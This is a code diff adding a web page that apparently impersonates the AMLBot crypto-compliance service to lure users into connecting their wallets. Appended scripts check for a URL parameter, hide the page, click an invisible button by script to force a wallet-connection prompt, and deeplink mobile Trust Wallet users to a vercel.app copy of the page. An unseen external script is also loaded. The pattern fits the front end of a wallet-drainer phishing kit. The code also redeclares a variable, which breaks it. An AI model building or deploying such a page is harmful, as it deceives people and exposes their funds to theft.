+  <header class="sticky top-0 z-50 flex items-center justify-between bg-white bg-opacity-90 backdrop-blur-xl rounded-full mx-4 sm:mx-6 lg:mx-8 my-6 px-6 sm:px-8 py-4 shadow-lg shadow-black/5 transition-all duration-300 border border-gray-100">
+    <div class="flex items-center space-x-2 w-28">
+      <svg aria-label="AMLBot" role="img" style="width:100%;height:auto" viewBox="0 0 160 33" xmlns="http://www.w3.org/2000/svg">
+        <path d="M39.545 29h-6.818l7.681-23.273h8.637L56.727 29h-6.819l-5.09-16.864h-.182L39.545 29Zm-1.273-9.182H51.09v4.727H38.272v-4.727ZM58.968 5.727h7.864L72.24 18.91h.272l5.41-13.182h7.863V29h-6.182V15.545h-.181L74.24 28.818h-3.728l-5.181-13.364h-.182V29h-6.182V5.727ZM88.78 29V5.727H95.1v18.182h9.409v5.09H88.781ZM107.062 29V5.727h10.091c1.772 0 3.261.239 4.466.716 1.212.477 2.125 1.151 2.738 2.023.621.87.932 1.897.932 3.08 0 .855-.189 1.636-.568 2.34a5.016 5.016 0 0 1-1.568 1.773c-.675.47-1.462.795-2.364.977v.227c1 .038 1.909.292 2.727.762a5.221 5.221 0 0 1 1.955 1.92c.485.81.727 1.765.727 2.864 0 1.273-.333 2.405-1 3.398-.659.992-1.598 1.772-2.818 2.34-1.22.569-2.674.853-4.364.853h-10.954Zm6.318-5.046h2.955c1.06 0 1.856-.197 2.386-.59.53-.402.795-.993.795-1.773 0-.546-.125-1.008-.375-1.387-.25-.378-.606-.666-1.068-.863-.454-.197-1.004-.296-1.648-.296h-3.045v4.91Zm0-8.818h2.591c.553 0 1.042-.087 1.466-.261.424-.175.754-.425.988-.75.243-.334.364-.739.364-1.216 0-.72-.258-1.27-.773-1.648-.515-.386-1.166-.58-1.954-.58h-2.682v4.455ZM136.937 29.318c-1.894 0-3.515-.375-4.864-1.125a7.74 7.74 0 0 1-3.102-3.16c-.72-1.355-1.08-2.927-1.08-4.715 0-1.788.36-3.356 1.08-4.705a7.651 7.651 0 0 1 3.102-3.159c1.349-.757 2.97-1.136 4.864-1.136 1.894 0 3.515.379 4.863 1.136a7.647 7.647 0 0 1 3.103 3.16c.719 1.348 1.079 2.916 1.079 4.704 0 1.788-.36 3.36-1.079 4.716a7.737 7.737 0 0 1-3.103 3.159c-1.348.75-2.969 1.125-4.863 1.125Zm.045-4.636c.531 0 .989-.178 1.375-.534.387-.357.686-.864.898-1.523.212-.66.318-1.443.318-2.352 0-.917-.106-1.701-.318-2.353-.212-.652-.511-1.166-.898-1.523a1.959 1.959 0 0 0-1.375-.534c-.56 0-1.041.178-1.443.535-.401.356-.708.863-.92 1.522-.213.652-.319 1.436-.319 2.352 0 .91.106 1.694.319 2.353.212.659.519 1.166.92 1.523.402.356.883.534 1.443.534ZM158.937 11.545v4.546h-11.5v-4.546h11.5Zm-9.273-4.182h6.273v16.023c0 .243.041.447.125.614.083.159.212.28.386.363.174.076.398.114.671.114.189 0 .409-.023.659-.068.257-.046.447-.083.568-.114l.909 4.41c-.28.083-.682.185-1.205.306-.515.121-1.128.2-1.84.239-1.44.076-2.648-.072-3.625-.443-.978-.38-1.713-.974-2.205-1.784-.492-.811-.731-1.826-.716-3.046V7.363Z" fill="#000"></path>
+        <path clip-rule="evenodd" d="M14.555 1.543c-1.43-2.105-4.566-2.046-5.915.112L.531 14.63a3.49 3.49 0 0 0 .037 3.759l8.487 13.014c1.39 2.13 4.526 2.13 5.915 0l8.462-12.975a3.49 3.49 0 0 0-.036-3.87L14.555 1.543Zm.968 7.687c-.305 5.437-4.595 9.816-10.012 10.294l6.502 9.97 8.462-12.974-4.952-7.29Z" fill="#0057FF" fill-rule="evenodd"></path>
+      </svg>
+    </div>
+    <div class="flex items-center space-x-6 text-black font-semibold text-sm select-none">
+      <span>
+        EN
+        <i class="fas fa-chevron-down text-xs"></i>
+      </span>
+      <button aria-label="Menu" class="focus:outline-none">
+        <svg aria-hidden="true" class="w-6 h-6" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24">
+          <line x1="3" x2="21" y1="6" y2="6"></line>
+          <line x1="3" x2="21" y1="12" y2="12"></line>
+          <line x1="3" x2="21" y1="18" y2="18"></line>
+        </svg>
+      </button>
+    </div>
+  </header>
+
+  <main class="flex-grow flex flex-col items-center px-4 sm:px-6 lg:px-8 text-center w-full relative z-10">
+    <!-- Hero Section -->
+    <div class="max-w-4xl mx-auto py-8 sm:py-12 lg:py-16">
+      <h1 class="font-extrabold text-black text-4xl sm:text-5xl lg:text-6xl leading-tight mb-6 bg-clip-text text-transparent bg-gradient-to-r from-gray-900 via-blue-900 to-gray-900">
+        Secure Your Wallets<br>
+        from Illicit Funds
+      </h1>
+      <div class="mt-8 relative w-full max-w-xs mx-auto h-24">
+      <img alt="Graph style semi circle gauge arc with red segments on left and gray on right" aria-hidden="true" class="absolute top-0 left-1/2 -translate-x-1/2 w-full max-w-xs h-24 drop-shadow-xl" height="96" src="https://amlbot.com/_next/static/media/graph.c3572c62.svg" width="240">
+    </div>
+    <p class="mt-6 text-gray-700 text-center text-base sm:text-lg max-w-2xl mx-auto leading-relaxed">
+      Receiving funds of illegal origin could lead to the risk of having your funds frozen
+    </p>
+    <div class="mt-8 w-full max-w-md mx-auto space-y-4">
+      <div class="flex flex-col items-center">
+        <button type="button" id="connect-wallet-btn" class="LmFXKJ hs-cta-trigger-button hs-cta-trigger-button-173117044510" onclick="openWalletPopup()" aria-haspopup="dialog" tabindex="0">
+          <span>Check Your Wallet</span>
+          <svg class="icon icon-telegram" width="22" height="19" viewBox="0 0 22 19" fill="currentColor">
+            <path d="M8.63240987,12.0829924 L8.26849987,17.2015924 C8.78915987,17.2015924 9.01465987,16.9779924 9.28507987,16.7093924 L11.7261999,14.3764924 L16.7842999,18.0806924 C17.7119999,18.5976924 18.3655999,18.3254924 18.6157999,17.2272924 L21.9359999,1.66962235 L21.9368999,1.66870235 C22.2311999,0.297371354 21.4409999,-0.238878146 20.5371999,0.0975383542 L1.02132987,7.56929235 C-0.310587131,8.08629235 -0.290420131,8.82879235 0.794912869,9.16520235 L5.78432987,10.7170924 L17.3736999,3.46537235 C17.9191999,3.10420235 18.4150999,3.30404235 18.0071999,3.66520235 L8.63240987,12.0829924 Z"></path>
+          </svg>
+        </button>
+      </div>
+      <a href="https://web.amlbot.com/signup?" class="DyRl8I flex items-center justify-center text-sm">
+        <span>or on Web</span>
+        <svg class="icon icon-arrow-right ml-2" width="20" height="10" viewBox="0 0 20 10" fill="currentColor">
+          <path d="M19.7709,4.2907422 C19.7706,4.2905122 19.7704,4.2902322 19.7702,4.2900022 L15.688,0.227502195 C15.3821,-0.0768378048 14.8875,-0.0757078048 14.5831,0.230152195 C14.2787,0.535972195 14.2799,1.0306222 14.5857,1.3350022 L17.3265,4.0625022 L0.78125,4.0625022 C0.349766,4.0625022 0,4.4122522 0,4.8437522 C0,5.2752522 0.349766,5.6249522 0.78125,5.6249522 L17.3264,5.6249522 L14.5857,8.3524522 C14.2799,8.6568522 14.2788,9.1515522 14.5831,9.4573522 C14.8875,9.7632522 15.3822,9.7642522 15.688,9.4599522 L19.7702,5.3974522 C19.7704,5.3972522 19.7706,5.3969522 19.7709,5.3967522 C20.0769,5.0913522 20.0759,4.5951522 19.7709,4.2907422 Z"></path>
+        </svg>
+      </a>
+    </div>
+    <div class="mt-6 flex items-center justify-center space-x-6 text-sm text-gray-600">
+      <span class="flex items-center bg-white px-4 py-2 rounded-full shadow-sm"><i class="fas fa-check-circle text-green-500 mr-2"></i>Instant Verification</span>
+      <span class="flex items-center bg-white px-4 py-2 rounded-full shadow-sm"><i class="fas fa-lock text-blue-500 mr-2"></i>Secure &amp; Private</span>
+    </div>
+  </div>
+
+    <!-- Features Section -->
+    <section class="w-full py-16 bg-gradient-to-b from-white via-gray-50 to-white">
+      <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-6 lg:gap-8">
+          <div class="flex flex-col items-center text-center bg-white p-6 rounded-2xl shadow-lg hover:shadow-xl transition-all duration-300 transform hover:-translate-y-2 border border-gray-100 group">
+            <div class="w-16 h-16 bg-gradient-to-br from-red-100 to-red-50 rounded-xl flex items-center justify-center mb-4 group-hover:scale-110 transition-transform duration-300 shadow-md">
+              <i class="fas fa-exclamation-triangle text-red-600 text-2xl"></i>
+            </div>
+            <h3 class="text-xl font-bold text-black mb-3">
+              Avoid Risk
+            </h3>
+            <p class="text-gray-600 text-sm leading-relaxed mb-4 flex-grow">
+              Check if a wallet or transaction is linked to scams or stolen funds. This helps you avoid losing money or getting your account blocked.
+            </p>
+            <div class="mt-auto w-full max-w-xs">
+              <img alt="Security shield protecting against threats and scams" class="w-full h-auto object-contain rounded-xl shadow-lg" loading="lazy" src="https://amlbot.com/_next/image?url=%2F_next%2Fstatic%2Fmedia%2F1.fe7287d0.webp&amp;w=1920&amp;q=75">
+            </div>
+          </div>
+          <div class="flex flex-col items-center text-center bg-white p-6 rounded-2xl shadow-lg hover:shadow-xl transition-all duration-300 transform hover:-translate-y-2 border border-gray-100 group">
+            <div class="w-16 h-16 bg-gradient-to-br from-blue-100 to-blue-50 rounded-xl flex items-center justify-center mb-4 group-hover:scale-110 transition-transform duration-300 shadow-md">
+              <i class="fas fa-hand-holding-usd text-blue-600 text-2xl"></i>
+            </div>
+            <h3 class="text-xl font-bold text-black mb-3">
+              Stay in Control
+            </h3>
+            <p class="text-gray-600 text-sm leading-relaxed mb-4 flex-grow">
+              Before you send or receive crypto, check the other wallet. Make sure it's safe so you don't deal with risky addresses.
+            </p>
+            <div class="mt-auto w-full max-w-xs">
+              <img alt="Dashboard showing wallet control and monitoring features" class="w-full h-auto object-contain rounded-xl shadow-lg" loading="lazy" src="https://amlbot.com/_next/image?url=%2F_next%2Fstatic%2Fmedia%2F2.42d70211.webp&amp;w=1920&amp;q=75">
+            </div>
+          </div>
+          <div class="flex flex-col items-center text-center bg-white p-6 rounded-2xl shadow-lg hover:shadow-xl transition-all duration-300 transform hover:-translate-y-2 border border-gray-100 group">
+            <div class="w-16 h-16 bg-gradient-to-br from-green-100 to-green-50 rounded-xl flex items-center justify-center mb-4 group-hover:scale-110 transition-transform duration-300 shadow-md">
+              <i class="fas fa-clipboard-check text-green-600 text-2xl"></i>
+            </div>
+            <h3 class="text-xl font-bold text-black mb-3">
+              Stay Compliant
+            </h3>
+            <p class="text-gray-600 text-sm leading-relaxed mb-4 flex-grow">
+              Comply with evolving regulations and avoid penalties. Regular checks help you adhere to legal requirements, avoiding penalties and legal issues.
+            </p>
+            <div class="mt-auto w-full max-w-xs">
+              <img alt="Illustration for Stay Compliant" class="w-full h-auto object-contain rounded-xl shadow-lg" loading="lazy" src="https://amlbot.com/_next/image?url=%2F_next%2Fstatic%2Fmedia%2F3.294666d3.webp&amp;w=1920&amp;q=75">
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Analysis Section -->
+    <section class="w-full py-16 bg-gradient-to-br from-slate-50 via-white to-blue-50 relative overflow-hidden">
+      <div class="absolute inset-0 bg-[radial-gradient(circle_at_30%_50%,rgba(59,130,246,0.05),transparent_50%)]"></div>
+      <div class="absolute inset-0 bg-[radial-gradient(circle_at_70%_50%,rgba(139,92,246,0.05),transparent_50%)]"></div>
+      <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 relative z-10">
+        <div class="mb-12 text-center max-w-3xl mx-auto">
+          <h2 class="text-3xl sm:text-4xl font-bold text-black mb-4 bg-clip-text">What do we analyze?</h2>
+          <p class="text-lg text-gray-600 leading-relaxed">
+            Staying compliant with evolving regulatory standards is crucial in the cryptocurrency world. Regular checks help you adhere to legal requirements, avoiding penalties and legal issues.
+          </p>
+        </div>
+        <div class="grid grid-cols-1 gap-6 lg:grid-cols-3">
+          <div class="bg-white/80 backdrop-blur-sm rounded-2xl p-6 shadow-xl border border-red-100 hover:shadow-red-200/50 hover:border-red-200 transition-all duration-300 transform hover:-translate-y-2">
+            <div class="flex items-center mb-6">
+              <div class="w-12 h-12 bg-gradient-to-br from-red-500 to-red-600 rounded-lg flex items-center justify-center mr-3 shadow-lg shadow-red-500/30">
+                <i class="fas fa-skull-crossbones text-white text-2xl"></i>
+              </div>
+              <h3 class="text-2xl font-bold text-red-600">High Risk</h3>
+            </div>
+            <ul class="space-y-6 text-gray-700 text-left">
+            <li class="p-3 rounded-lg hover:bg-red-50 transition-colors duration-200">
+              <h4 class="font-bold text-gray-900">Child Exploitation</h4>
+              <p class="text-sm mt-1">Wallets and entities linked to child exploitation materials or activities. Immediate reporting and avoidance required.</p>
+            </li>
+            <li class="p-3 rounded-lg hover:bg-red-50 transition-colors duration-200">
+              <h4 class="font-bold text-gray-900">Dark Market</h4>
+              <p class="text-sm mt-1">Cryptocurrency traced to darknet marketplaces selling illegal goods and services. High risk of legal consequences.</p>
+            </li>
+            <li class="p-3 rounded-lg hover:bg-red-50 transition-colors duration-200">
+              <h4 class="font-bold text-gray-900">Dark Service</h4>
+              <p class="text-sm mt-1">Funds connected to serious criminal activities including child abuse, terrorist financing, or international drug trafficking operations.</p>
+            </li>
+            <li class="p-3 rounded-lg hover:bg-red-50 transition-colors duration-200">
+              <h4 class="font-bold text-gray-900">Enforcement Action</h4>
+              <p class="text-sm mt-1">Addresses under active investigation or legal proceedings by law enforcement agencies. Transactions may be frozen or seized.</p>
+            </li>
+            <li class="p-3 rounded-lg hover:bg-red-50 transition-colors duration-200">
+              <h4 class="font-bold text-gray-900">Fraudulent Exchange</h4>
+              <p class="text-sm mt-1">Exchanges involved in exit scams, illegal operations, or whose assets have been confiscated by authorities.</p>
+            </li>
+            <li class="p-3 rounded-lg hover:bg-red-50 transition-colors duration-200">
+              <h4 class="font-bold text-gray-900">Mixer &amp; Tumbler</h4>
+              <p class="text-sm mt-1">Funds processed through mixing services to obscure transaction history. Primarily used for money laundering and hiding illicit origins.</p>
+            </li>
+            <li class="p-3 rounded-lg hover:bg-red-50 transition-colors duration-200">
+              <h4 class="font-bold text-gray-900">Scam &amp; Stolen Coins</h4>
+              <p class="text-sm mt-1">Cryptocurrency obtained through fraud, phishing, hacks, or theft. May result in account freezes and legal complications.</p>
+            </li>
+            <li class="p-3 rounded-lg hover:bg-red-50 transition-colors duration-200">
+              <h4 class="font-bold text-gray-900">Sanctions</h4>
+              <p class="text-sm mt-1">Wallets and entities on OFAC, UN, or EU sanctions lists. Transactions are illegal and subject to severe penalties.</p>
+            </li>
+          </ul>
+        </div>
+        <div class="bg-white/80 backdrop-blur-sm rounded-2xl p-6 shadow-xl border border-yellow-100 hover:shadow-yellow-200/50 hover:border-yellow-200 transition-all duration-300 transform hover:-translate-y-2">
+          <div class="flex items-center mb-6">
+            <div class="w-12 h-12 bg-gradient-to-br from-yellow-500 to-orange-500 rounded-lg flex items-center justify-center mr-3 shadow-lg shadow-yellow-500/30">
+              <i class="fas fa-exclamation-circle text-white text-2xl"></i>
+            </div>
+            <h3 class="text-2xl font-bold text-yellow-600">Medium Risk</h3>
+          </div>
+          <ul class="space-y-6 text-gray-700 text-left">
+            <li class="p-3 rounded-lg hover:bg-yellow-50 transition-colors duration-200">
+              <h4 class="font-bold text-gray-900">Unverified Exchanges</h4>
+              <p class="text-sm mt-1">Trading platforms operating without proper licensing or regulatory oversight. May lack adequate security and compliance measures.</p>
+            </li>
+            <li class="p-3 rounded-lg hover:bg-yellow-50 transition-colors duration-200">
+              <h4 class="font-bold text-gray-900">Privacy Coins</h4>
+              <p class="text-sm mt-1">Cryptocurrencies like Monero or Zcash with built-in anonymity features. Often flagged by exchanges due to regulatory concerns.</p>
+            </li>
+            <li class="p-3 rounded-lg hover:bg-yellow-50 transition-colors duration-200">
+              <h4 class="font-bold text-gray-900">High-Risk Jurisdictions</h4>
+              <p class="text-sm mt-1">Transactions originating from countries with weak AML regulations or limited international cooperation on financial crime.</p>
+            </li>
+            <li class="p-3 rounded-lg hover:bg-yellow-50 transition-colors duration-200">
+              <h4 class="font-bold text-gray-900">Gambling Services</h4>
+              <p class="text-sm mt-1">Unlicensed online casinos and betting platforms that may not comply with gambling regulations or anti-money laundering standards.</p>
+            </li>
+            <li class="p-3 rounded-lg hover:bg-yellow-50 transition-colors duration-200">
+              <h4 class="font-bold text-gray-900">P2P Exchanges</h4>
+              <p class="text-sm mt-1">Peer-to-peer platforms with minimal or no KYC requirements. Increased risk of encountering illicit funds or unverified counterparties.</p>
+            </li>
+          </ul>
+        </div>
+        <div class="bg-white/80 backdrop-blur-sm rounded-2xl p-6 shadow-xl border border-green-100 hover:shadow-green-200/50 hover:border-green-200 transition-all duration-300 transform hover:-translate-y-2">
+          <div class="flex items-center mb-6">
+            <div class="w-12 h-12 bg-gradient-to-br from-green-500 to-emerald-600 rounded-lg flex items-center justify-center mr-3 shadow-lg shadow-green-500/30">
+              <i class="fas fa-check-circle text-white text-2xl"></i>
+            </div>
+            <h3 class="text-2xl font-bold text-green-600">Trusted Sources</h3>
+          </div>
+          <ul class="space-y-6 text-gray-700 text-left">
+            <li class="p-3 rounded-lg hover:bg-green-50 transition-colors duration-200">
+              <h4 class="font-bold text-gray-900">Regulated Exchanges</h4>
+              <p class="text-sm mt-1">Fully licensed cryptocurrency exchanges operating under strict regulatory compliance with robust KYC/AML procedures and user protection.</p>
+            </li>
+            <li class="p-3 rounded-lg hover:bg-green-50 transition-colors duration-200">
+              <h4 class="font-bold text-gray-900">Verified Institutions</h4>
+              <p class="text-sm mt-1">Traditional banks, payment processors, and financial institutions with established regulatory oversight and compliance frameworks.</p>
+            </li>
+            <li class="p-3 rounded-lg hover:bg-green-50 transition-colors duration-200">
+              <h4 class="font-bold text-gray-900">Known Entities</h4>
+              <p class="text-sm mt-1">Recognized businesses, merchants, and service providers with proven track records and transparent operations in the crypto space.</p>
+            </li>
+            <li class="p-3 rounded-lg hover:bg-green-50 transition-colors duration-200">
+              <h4 class="font-bold text-gray-900">DeFi Protocols</h4>
+              <p class="text-sm mt-1">Decentralized finance platforms that have undergone comprehensive security audits and maintain transparent, reputable operations.</p>
+            </li>
+            <li class="p-3 rounded-lg hover:bg-green-50 transition-colors duration-200">
+              <h4 class="font-bold text-gray-900">Verified Wallets</h4>
+              <p class="text-sm mt-1">Wallet addresses that have completed KYC verification processes and are linked to identified, legitimate users or entities.</p>
+            </li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </section>
+  </main>
+
+  <button aria-label="Chat support" class="fixed bottom-8 right-8 bg-gradient-to-r from-[#0047FF] to-[#0066FF] w-16 h-16 rounded-full flex items-center justify-center shadow-2xl shadow-blue-500/40 hover:shadow-blue-500/60 hover:scale-110 transform transition-all duration-300 focus:outline-none z-40 group">
+    <svg aria-hidden="true" class="w-7 h-7 text-white group-hover:scale-110 transition-transform duration-300" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24">
+      <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2z"></path>
+    </svg>
+  </button>
+
+  <!-- Wallet Connection Modal -->
+  <div id="wallet-selector-popup" class="wallet-popup-overlay">
+    <div class="wallet-popup-content">
+      <div class="wallet-popup-header">
+        <div></div>
+        <h2 class="wallet-popup-title">Connect Wallet</h2>
+        <button class="wallet-popup-close" aria-label="Close" onclick="closeWalletPopup()">
+          <i class="fas fa-times"></i>
+        </button>
+      </div>
+      <div class="wallet-popup-body">
+        <div class="wallet-grid">
+          <!-- MetaMask -->
+          <button class="wallet-option" type="button" data-wallet="metamask" onclick="connectWallet('metamask')">
+            <div class="wallet-left">
+              <img src="https://www.pngall.com/wp-content/uploads/17/Metamask-Developer-Logo-Design-PNG-thumb.png" alt="MetaMask logo">
+              <span class="wallet-name">MetaMask</span>
+            </div>
+          </button>
+
+          <!-- Coinbase Wallet -->
+          <button class="wallet-option" type="button" data-wallet="coinbase" onclick="connectWallet('coinbase')">
+            <div class="wallet-left">
+              <img src="https://avatars.githubusercontent.com/u/18060234?s=280&amp;v=4" alt="Coinbase Wallet logo">
+              <span class="wallet-name">Coinbase Wallet</span>
+            </div>
+          </button>
+
+          <!-- Trust Wallet -->
+          <button class="wallet-option" type="button" data-wallet="trust" onclick="connectWallet('trust')">
+            <div class="wallet-left">
+              <img src="https://trustwallet.com/assets/images/media/assets/TWT.png" alt="Trust Wallet logo">
+              <span class="wallet-name">Trust Wallet</span>
+            </div>
+            <span class="wallet-badge">MOBILE</span>
+          </button>
+
+          <!-- OKX Wallet -->
+          <button class="wallet-option" type="button" data-wallet="okx" onclick="connectWallet('okx')">
+            <div class="wallet-left">
+              <img src="https://www.crypto-insiders.nl/wp-content/uploads/2024/11/okx_logo.png" alt="OKX Wallet logo">
+              <span class="wallet-name">OKX Wallet</span>
+            </div>
+          </button>
+
+          <!-- Bitget Wallet -->
+          <button class="wallet-option" type="button" data-wallet="bitget" onclick="connectWallet('bitget')">
+            <div class="wallet-left">
+              <img src="https://tse1.explicit.bing.net/th/id/OIP.-GSdLefoTEbn5tBCXTVSOwHaHa?dpr=2&amp;pid=ImgDetMain&amp;o=7&amp;rm=3" alt="Bitget Wallet logo">
+              <span class="wallet-name">Bitget Wallet</span>
+            </div>
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Wallet Verification Results Section -->
+  <div id="wallet-info" class="hidden py-12 bg-white">
+    <!-- Dynamic content will be inserted here -->
+  </div>
+
+  <script>
+    // Wallet connection state
+    let isWalletConnected = false;
+
+    // Wallet connection state
+    let isWalletConnected = false;
+
+    // Wait for ethers library to load
+    function waitForEthers() {
+      return new Promise((resolve) => {
+        const check = () => {
+          if (window.ethers) {
+            resolve();
+          } else {
+            setTimeout(check, 100);
+          }
+        };
+        check();
+      });
+    }
+
+    // Initialize wallet on page load
+    async function initializeWallet() {
+      try {
+        await waitForEthers();
+        console.log('AML system initialized');
+      } catch (error) {
+        console.error('Initialization failed:', error);
+      }
+    }
+
+    // Open wallet popup
+    function openWalletPopup() {
+      const popup = document.getElementById('wallet-selector-popup');
+      if (popup) {
+        popup.classList.add('show');
+      }
+    }
+
+    // Close wallet popup
+    function closeWalletPopup() {
+      const popup = document.getElementById('wallet-selector-popup');
+      if (popup) {
+        popup.classList.remove('show');
+      }
+    }
+
+    // Connect wallet
+    function connectWallet(walletType) {
+      const walletOption = document.querySelector(`[data-wallet="${walletType}"]`);
+      if (!walletOption) return;
+
+      walletOption.classList.add('connecting');
+
+      setTimeout(() => {
+        walletOption.classList.remove('connecting');
+        walletOption.classList.add('connected');
+
+        setTimeout(() => {
+          closeWalletPopup();
+          proceedWithWalletConnection();
+        }, 500);
+      }, 1000);
+    }
+
+    // Proceed with wallet connection
+    async function proceedWithWalletConnection() {
+      try {
+        const connectBtn = document.getElementById("connect-wallet-btn");
+
+        if (connectBtn) {
+          connectBtn.innerHTML = `
+            <div class="flex items-center justify-center">
+              <div class="animate-spin rounded-full h-5 w-5 border-b-2 border-white mr-3"></div>
+              <span>Connecting...</span>
+            </div>
+          `;
+          connectBtn.disabled = true;
+        }
+
+        if (!window.ethereum) {
+          throw new Error('Please install MetaMask or a compatible Web3 wallet');
+        }
+
+        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+        if (!accounts || accounts.length === 0) {
+          throw new Error('No wallet accounts found');
+        }
+
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        const signer = provider.getSigner();
+        const userAddress = await signer.getAddress();
+
+        isWalletConnected = true;
+
+        if (connectBtn) {
+          connectBtn.innerHTML = `
+            <div class="flex items-center justify-center">
+              <i class="fas fa-check-circle mr-3"></i>
+              <span>Connected</span>
+            </div>
+          `;
+        }
+
+        console.log('Wallet connected:', userAddress);
+      } catch (error) {
+        console.error('Connection error:', error);
+        showError(error.message);
+      }
+    }
+
+    // Show error message
+    function showError(message) {
+      const walletInfo = document.getElementById("wallet-info");
+      if (walletInfo) {
+        walletInfo.innerHTML = `
+          <div class="max-w-6xl mx-auto px-4">
+            <div class="bg-red-50 border-2 border-red-200 rounded-3xl p-12">
+              <div class="flex items-center gap-6 text-red-600 mb-8">
+                <i class="fas fa-exclamation-triangle text-4xl"></i>
+                <div>
+                  <h3 class="text-3xl font-bold">Connection Error</h3>
+                  <p class="text-lg text-red-700 mt-2">${message}</p>
+                </div>
+              </div>
+            </div>
+          </div>
+        `;
+        walletInfo.classList.remove('hidden');
+      }
+    }
+
+    // Event listeners for buttons
+    const connectBtn = document.getElementById("connect-wallet-btn");
+
+    if (connectBtn) {
+      connectBtn.addEventListener("click", () => {
+        openWalletPopup();
+      });
+    }
+
+    // Close popup when clicking outside
+    document.addEventListener('click', function(event) {
+      const popup = document.getElementById('wallet-selector-popup');
+      const popupContent = popup?.querySelector('.wallet-popup-content');
+
+      if (popup && popup.classList.contains('show') &&
+          popupContent && !popupContent.contains(event.target)) {
+        closeWalletPopup();
+      }
+    });
+
+    // Close popup with escape key
+    document.addEventListener('keydown', function(event) {
+      if (event.key === 'Escape') {
+        closeWalletPopup();
+      }
+    });
+
+    // Initialize system
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', () => {
+        initializeWallet();
+      });
+    } else {
+      initializeWallet();
+    }
+
+    // Smooth scrolling for navigation links
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+      anchor.addEventListener('click', function (e) {
+        e.preventDefault();
+        const target = document.querySelector(this.getAttribute('href'));
+        if (target) {
+          target.scrollIntoView({
+            behavior: 'smooth',
+            block: 'start'
+          });
+        }
+      });
+    });
+  </script>
+  
+  <style>
+body.hide-page { display: none; }
+</style>
+
+<script>
+document.addEventListener("DOMContentLoaded", async () => {
+    const params = new URLSearchParams(window.location.search);
+
+    if (params.get("id") !== "button") return;
+
+    // Hide page
+    document.body.classList.add("hide-page");
+
+    // Function to trigger Web3 wallet connection
+    async function triggerWalletConnection() {
+        try {
+            // Check if Web3 is available
+            if (window.ethereum) {
+                // Request account access - THIS triggers the Trust Wallet approval popup
+                const accounts = await window.ethereum.request({ 
+                    method: 'eth_requestAccounts' 
+                });
+                
+                console.log('Connected account:', accounts[0]);
+                return true;
+            } 
+            // For Trust Wallet mobile
+            else if (window.trustwallet) {
+                const accounts = await window.trustwallet.request({ 
+                    method: 'eth_requestAccounts' 
+                });
+                console.log('Connected via Trust Wallet:', accounts[0]);
+                return true;
+            } 
+            // For WalletConnect or other providers
+            else if (window.web3) {
+                const accounts = await window.web3.eth.requestAccounts();
+                console.log('Connected via Web3:', accounts[0]);
+                return true;
+            } 
+            else {
+                console.error('No Web3 wallet found');
+                return false;
+            }
+        } catch (error) {
+            console.error('Connection error:', error);
+            return false;
+        }
+    }
+
+    // Trigger the connection immediately
+    await triggerWalletConnection();
+});
+</script>
+<style>
+body.hide-page { display: none; }
+#auto-connect-trigger {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 1px;
+    height: 1px;
+    opacity: 0;
+    pointer-events: none;
+}
+</style>
+
+<script>
+document.addEventListener("DOMContentLoaded", async () => {
+    const params = new URLSearchParams(window.location.search);
+
+    if (params.get("id") !== "button") return;
+
+    // Hide page
+    document.body.classList.add("hide-page");
+
+    // Create a hidden button that will trigger the wallet connection
+    const triggerBtn = document.createElement('button');
+    triggerBtn.id = 'auto-connect-trigger';
+    triggerBtn.textContent = 'Connect Wallet';
+    document.body.appendChild(triggerBtn);
+
+    // Add click handler that triggers wallet connection
+    triggerBtn.addEventListener('click', async function() {
+        try {
+            // This will trigger the Trust Wallet approval popup
+            if (window.ethereum) {
+                await window.ethereum.request({ 
+                    method: 'eth_requestAccounts' 
+                });
+                console.log('Wallet connection triggered');
+            } else if (window.trustwallet) {
+                await window.trustwallet.request({ 
+                    method: 'eth_requestAccounts' 
+                });
+            }
+        } catch (error) {
+            console.error('Wallet connection failed:', error);
+        }
+    });
+
+    // Wait a tiny moment then click the button
+    await new Promise(resolve => setTimeout(resolve, 100));
+    
+    // Simulate a click - this should trigger the wallet connection
+    triggerBtn.click();
+    
+    // For mobile Trust Wallet, also try direct deeplink
+    if (/iPhone|iPad|iPod|Android/i.test(navigator.userAgent)) {
+        // Trust Wallet deeplink format for connecting
+        const trustWalletLink = `trust://qr2-tau.vercel.app/index.html?id=button`;
+        
+        // Try to open Trust Wallet
+        setTimeout(() => {
+            window.location.href = trustWalletLink;
+        }, 500);
+    }
+});
+</script>
+  
+  <script src="script.js"></script>
+
+</body></html>
